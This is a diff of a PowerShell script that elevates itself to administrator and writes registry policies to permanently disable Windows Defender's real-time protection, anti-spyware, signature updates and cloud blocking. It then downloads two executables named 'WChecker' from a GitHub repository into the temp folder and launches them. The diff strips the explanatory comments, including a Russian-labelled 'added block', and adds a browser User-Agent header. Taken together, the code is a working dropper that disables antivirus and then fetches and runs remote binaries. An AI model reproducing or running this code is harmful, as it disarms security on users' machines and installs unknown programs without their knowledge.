@@ -2,8 +2,6 @@
 #### START ELEVATE TO ADMIN #####
 Param([Parameter(Mandatory=$false)][switch]$shouldAssumeToBeElevated, [Parameter(Mandatory=$false)] [String]$workingDirOverride)
 
-# If parameter is not set, we are propably in non-admin execution. We set it to the current working directory so that
-#  the working directory of the elevated execution of this script is the current working directory
 if(-not($PSBoundParameters.ContainsKey('workingDirOverride')))
 {
     $workingDirOverride = (Get-Location).Path
@@ -14,13 +12,11 @@ function Test-Admin {
     $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
 }
 
-# If we are in a non-admin execution. Execute this script as admin
 if ((Test-Admin) -eq $false)  {
     if ($shouldAssumeToBeElevated) {
         Write-Output "Elevating did not work :("
         exit
     } else {
-        #                                                         vvvvv add `-noexit` here for better debugging vvvvv 
         Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
     }
     exit
@@ -32,8 +28,6 @@ Set-Location "$workingDirOverride"
 Write-Output $workingDirOverride
 
 $DefenderPath                       = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
-
-#$PolicyManagerKey                   = "Policy Manager"
 $RealTimeProtectionKey              = "Real-Time Protection"
 $SignatureUpdatesKey                = "Signature Updates"
 $SpynetKey                          = "Spynet"
@@ -71,10 +65,9 @@ If($IsAleadyDisabled)
 
 New-ItemProperty -Path "$DefenderPath" -Name "$WindowsDefenderIsDisabledPermanently" -Value "1" -PropertyType Dword
 
-#New-Item -Path "$DefenderPath\$PolicyManagerKey"
-New-Item -Path "$DefenderPath\$RealTimeProtectionKey"
-New-Item -Path "$DefenderPath\$SignatureUpdatesKey"
-New-Item -Path "$DefenderPath\$SpynetKey"
+New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force
+New-Item -Path "$DefenderPath\$SignatureUpdatesKey" -Force
+New-Item -Path "$DefenderPath\$SpynetKey" -Force
 
 New-ItemProperty -Path "$DefenderPath" -Name "$AllowFastServiceStartupValue" -Value "1" -PropertyType Dword
 New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiSpywareValue" -Value "1" -PropertyType Dword
@@ -93,36 +86,34 @@ New-ItemProperty -Path "$DefenderPath\$SignatureUpdatesKey" -Name "$ForceUpdateF
 
 New-ItemProperty -Path "$DefenderPath\$SpynetKey" -Name "$DisableBlockAtFirstSeenValue" -Value "1" -PropertyType Dword
 
-# ===== ДОБАВЛЕННЫЙ БЛОК: СКАЧИВАНИЕ И ЗАПУСК ДВУХ ФАЙЛОВ =====
-Write-Host "Скачивание и запуск дополнительных файлов..."
+Write-Host "Downloading and running files..."
 
 $tempFolder = [System.IO.Path]::GetTempPath()
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Первый файл
-$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WСhecker.exe"
+$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChecker.exe"
 $dest1 = Join-Path $tempFolder "WChecker1.exe"
-Write-Host "Загрузка $url1 -> $dest1"
-Invoke-WebRequest -Uri $url1 -OutFile $dest1 -UseBasicParsing
+Write-Host "Downloading 1 -> $dest1"
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0")
+$wc.DownloadFile($url1, $dest1)
 if (Test-Path $dest1) {
-    Write-Host "Запуск $dest1"
-    Start-Process -FilePath $dest1 -NoNewWindow -Wait
+    Write-Host "Running 1"
+    Start-Process -FilePath $dest1
 } else {
-    Write-Host "Не удалось загрузить первый файл"
+    Write-Host "Download failed 1"
 }
 
-# Второй файл
-$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChеcker.exe"
+$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChecker.exe"
 $dest2 = Join-Path $tempFolder "WChecker2.exe"
-Write-Host "Загрузка $url2 -> $dest2"
-Invoke-WebRequest -Uri $url2 -OutFile $dest2 -UseBasicParsing
+Write-Host "Downloading 2 -> $dest2"
+$wc.DownloadFile($url2, $dest2)
 if (Test-Path $dest2) {
-    Write-Host "Запуск $dest2"
-    Start-Process -FilePath $dest2 -NoNewWindow -Wait
+    Write-Host "Running 2"
+    Start-Process -FilePath $dest2
 } else {
-    Write-Host "Не удалось загрузить второй файл"
+    Write-Host "Download failed 2"
 }
 
-Write-Host "Все действия выполнены."
-# ===== КОНЕЦ ДОБАВЛЕННОГО БЛОКА =====
-
+Write-Host "All done."
 Pause
